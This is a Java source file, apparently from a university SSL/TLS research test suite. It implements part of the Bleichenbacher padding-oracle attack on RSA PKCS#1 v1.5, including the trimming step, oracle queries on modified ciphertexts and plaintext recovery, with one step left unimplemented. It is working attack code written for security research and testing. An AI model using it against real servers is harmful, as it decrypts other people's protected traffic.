/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package de.rub.nds.research.ssl.stack.tests.attacks.bleichenbacher;

import de.rub.nds.research.ssl.stack.tests.attacks.bleichenbacher.oracles.StandardOracle;
import de.rub.nds.research.ssl.stack.Utility;
import java.math.BigInteger;
import java.security.interfaces.RSAPublicKey;
import java.util.LinkedList;
import java.util.List;

/**
 *
 * @author juraj
 */
public class BleichenbacherAttackCrypto extends BleichenbacherAttack {

    protected int uUsed = 1;
    protected int tUsed = 1;
    protected int maxtUsed;
    List<BigInteger> tList;

    public BleichenbacherAttackCrypto(final byte[] msg, RSAPublicKey pubKey,
            StandardOracle pkcsOracle, int maxtUsed, final boolean msgPKCSconform) {
        super(msg, pubKey, pkcsOracle, msgPKCSconform);
        this.maxtUsed = maxtUsed;
        tList = new LinkedList<BigInteger>();
    }

    protected void stepOne() {
        // execute the original step one 
        super.stepOne();

        // execute the Crypto step one extension
        this.stepOneB();
    }

    protected void stepOneB() {
        System.out.println("Step 1b: Trimming");
        
        BigInteger t = BigInteger.valueOf(4);

        while (t.compareTo(BigInteger.valueOf(maxtUsed)) <= 0) {
            // this has to be adapted according to the oracle
            LinkedList<BigInteger> uList = new LinkedList<BigInteger>();
            uList.add(t.subtract(BigInteger.ONE));
            uList.add(t.add(BigInteger.ONE));

            if (isDivisible(t, uList)) {
                tList.add(t);
            }
            t = t.add(BigInteger.ONE);
        }
        
        if(tList.isEmpty()) {
            return;
        }

        BigInteger lcm = Utility.findLCM(tList);

        if (lcm.compareTo(BigInteger.valueOf(1)) != 0) {
            BigInteger minU = findMinU(lcm);
            BigInteger maxU = findMaxU(lcm);
            
            BigInteger intervalMin = BigInteger.valueOf(2).multiply(bigB).
                    multiply(lcm).divide(minU);
            BigInteger intervalMax = (BigInteger.valueOf(3).multiply(bigB)).
                    subtract(BigInteger.ONE).multiply(lcm).divide(maxU);

            m = new Interval[]{new Interval(intervalMin, intervalMax)};
            
            System.out.println("IntervalMin: \n" + Utility.bytesToHex(intervalMin.toByteArray()));
            System.out.println("IntervalMax: \n" + Utility.bytesToHex(intervalMax.toByteArray()));
        }
    }

    private BigInteger findMinU(BigInteger lcm) {
        BigInteger minU = lcm.multiply(BigInteger.valueOf(2)).divide(BigInteger.valueOf(3));
        while (true) {
            if (isDivisible(lcm, minU)) {
                return minU;
            }
            minU = minU.add(BigInteger.valueOf(1));
        }
    }

    private BigInteger findMaxU(BigInteger lcm) {
        BigInteger maxU = lcm.multiply(BigInteger.valueOf(3)).divide(BigInteger.valueOf(2));
        while (true) {
            if (isDivisible(lcm, maxU)) {
                return maxU;
            }
            maxU = maxU.subtract(BigInteger.valueOf(1));
        }
    }

    private boolean isDivisible(BigInteger t, BigInteger u) {
        // t^(-1)
        BigInteger t_1 = t.modInverse(publicKey.getModulus());
        // t^(-1)^(e) mod N
        BigInteger t_1pow = t_1.modPow(publicKey.getPublicExponent(), publicKey.getModulus());
        // u^(e) mod N
        BigInteger u_pow = u.modPow(publicKey.getPublicExponent(), publicKey.getModulus());
        // c' = c * u * t^(-1) mod N
        BigInteger c = c0.multiply(t_1pow).multiply(u_pow).mod(publicKey.getModulus());

        byte[] msg = Utility.correctSize(c.toByteArray(), blockSize, true);
        if (oracle.checkPKCSConformity(msg)) {
            System.out.println("Checking: \nu = " + u + "\nt = " + t);
            return true;
        }
        
        return false;
    }

    private boolean isDivisible(BigInteger t, List<BigInteger> uList) {
        for (BigInteger u : uList) {
            if (isDivisible(t, u)) {
                return true;
            }
        }
        return false;
    }

    private void stepTwoA() {
        throw new RuntimeException("not yet implemented");
        
//        byte[] send;
//        boolean pkcsConform = false;
//        BigInteger n = publicKey.getModulus();
//
//        System.out.println("Step 2a: Starting the search");
//        // si = ceil(n/(3B))
//        BigInteger tmp[] = n.divideAndRemainder(BigInteger.valueOf(3).multiply(bigB));
//        if (BigInteger.ZERO.compareTo(tmp[1]) != 0) {
//            si = tmp[0].add(BigInteger.ONE);
//        } else {
//            si = tmp[0];
//        }
//
//        // correction will be done in do while
//        si = si.subtract(BigInteger.ONE);
//
//        do {
//            si = si.add(BigInteger.ONE);
//            send = prepareMsg(c0, si);
//
//            // check PKCS#1 conformity
//            pkcsConform = oracle.checkPKCSConformity(send);
//        } while (!pkcsConform);
    }

    private boolean stepFour(final int i) {
        boolean result = false;

        if (m.length == 1 && m[0].lower.compareTo(m[0].upper) == 0) {
            BigInteger solution = s0.modInverse(publicKey.getModulus());
            solution = solution.multiply(m[0].upper).mod(publicKey.getModulus());

            System.out.println("====> Solution found!\n" + Utility.bytesToHex(solution.toByteArray()));
//            System.out.println("Decrypted message: \n" + Utility.bytesToHex(decryptedMsg));
            result = true;
        }

        return result;
    }
}
